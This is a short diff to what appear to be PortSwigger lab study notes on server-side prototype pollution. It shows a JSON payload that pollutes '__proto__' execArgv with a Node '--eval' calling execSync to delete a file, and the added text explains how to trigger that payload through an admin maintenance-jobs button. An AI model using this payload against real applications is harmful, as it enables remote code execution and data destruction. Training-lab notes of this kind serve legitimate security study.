@@ -2850,7 +2850,7 @@ wrtz{{#with "s" as |string|}}
 }
 ```  
 
-Inject exploit in to read or delete user sensitive data.  
+Inject exploit in to read or delete user sensitive data. After injection, trigger new spawned node child processes, by using admin panel maintenance jobs button. This will action on Carlos `secret` file.  
 
 ```JSON
 "__proto__": {
@@ -2858,7 +2858,9 @@ Inject exploit in to read or delete user sensitive data.
         "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
     ]
 }
-``` 
+```  
+
+![SSPP JSON injection](images/sspp.png)  
 
 [PortSwigger Lab: Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)  
 
